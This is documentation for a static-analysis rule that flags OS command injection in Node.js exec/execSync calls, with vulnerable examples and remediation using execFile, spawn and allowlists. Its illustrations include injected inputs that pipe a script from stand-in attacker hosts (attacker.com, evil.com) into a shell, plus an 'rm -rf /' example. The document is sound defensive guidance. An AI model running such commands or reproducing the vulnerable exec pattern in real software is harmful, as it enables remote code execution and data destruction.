---
title: "VNX-NODE-003 – Command Injection via child_process"
description: "Detects child_process.exec() and execSync() calls that use template literals or string concatenation, which enable OS command injection when arguments contain user input."
---

## Overview

This rule detects calls to `exec()` or `execSync()` from Node.js's `child_process` module where the command string is built using template literals (`` ` `` with `${}`) or string concatenation (`+`). When any interpolated value originates from user input, an attacker can inject shell metacharacters to run arbitrary OS commands on the server. This is CWE-78 (Improper Neutralization of Special Elements used in an OS Command).

**Severity:** High | **CWE:** [CWE-78 – Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)

## Why This Matters

`exec()` passes its first argument to the system shell (`/bin/sh -c` on Unix). The shell interprets metacharacters like `;`, `&&`, `||`, `|`, `$()`, and backticks as command separators or substitutions. An attacker who controls even a small portion of the command string — a filename, an ID, a format option — can append `;rm -rf /` or `; curl attacker.com/shell.sh | bash`. The resulting execution happens with the full privileges of the Node.js process, which in many deployments runs as root or a privileged service account.

A typical target is any endpoint that wraps a CLI tool: image conversion, PDF generation, Git operations, archive utilities, or network diagnostics. These are all legitimate use cases where developers reach for `exec()` out of convenience, often without realising how easily shell injection bypasses the intended functionality.

## What Gets Flagged

The rule matches lines where `exec(` or `execSync(` appears alongside a template literal interpolation (`${`) or string concatenation (`+`).

```javascript
// FLAGGED: template literal interpolation in exec
const { exec } = require('child_process');
app.get('/convert', (req, res) => {
  exec(`convert ${req.query.file} output.png`, (err, stdout) => {
    res.send(stdout);
  });
});

// FLAGGED: string concatenation in execSync
const result = execSync('git log ' + req.params.branch);
```

An attacker sends `?file=input.jpg; curl https://evil.com/payload | sh` and the shell executes both the `convert` command and the injected curl.

## Remediation

1. **Replace `exec`/`execSync` with `execFile`/`execFileSync`.** `execFile` does not invoke a shell — it executes the binary directly with an array of arguments. Shell metacharacters in individual arguments are passed as literal strings, not interpreted.

   ```javascript
   // SAFE: execFile with array arguments — no shell, no injection
   const { execFile } = require('child_process');

   app.get('/convert', (req, res) => {
     const allowedFiles = /^[a-zA-Z0-9_\-]+\.(jpg|jpeg|png)$/;
     if (!allowedFiles.test(req.query.file)) {
       return res.status(400).send('Invalid filename');
     }
     execFile('convert', [req.query.file, 'output.png'], (err, stdout) => {
       if (err) return res.status(500).send('Conversion failed');
       res.send(stdout);
     });
   });
   ```

2. **Alternatively, use `spawn` with `shell: false` (the default).** `spawn` streams stdout/stderr and avoids buffering large outputs in memory, making it preferable for long-running processes.

   ```javascript
   // SAFE: spawn with explicit argument array
   const { spawn } = require('child_process');
   const proc = spawn('git', ['log', '--oneline', branchName]);
   proc.stdout.pipe(res);
   ```

3. **Validate and allowlist all inputs before use.** Even with `execFile`, you should restrict the set of permitted values to a known-good allowlist. For branch names, filenames, or identifiers, enforce a strict regex (`/^[a-zA-Z0-9_\-\.]+$/`) and reject anything else.

4. **Prefer native Node.js libraries over shelling out.** Many common CLI operations have pure-JS equivalents: use `sharp` for image processing, `nodegit` or `isomorphic-git` for Git operations, `archiver` for ZIP creation. Eliminating the shell call eliminates the injection surface entirely.

5. **Apply least privilege.** Run the Node.js process under a dedicated user with the minimum OS permissions required. Use Linux capabilities, Docker's `--cap-drop`, or a seccomp profile to restrict which system calls the process can make, limiting the blast radius of any injection.

## References

- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- [CAPEC-88: OS Command Injection](https://capec.mitre.org/data/definitions/88.html)
- [Node.js child_process.execFile documentation](https://nodejs.org/api/child_process.html#child_processexecfilefile-args-options-callback)
- [OWASP Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [OWASP Node.js Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html)
- [MITRE ATT&CK T1059 – Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
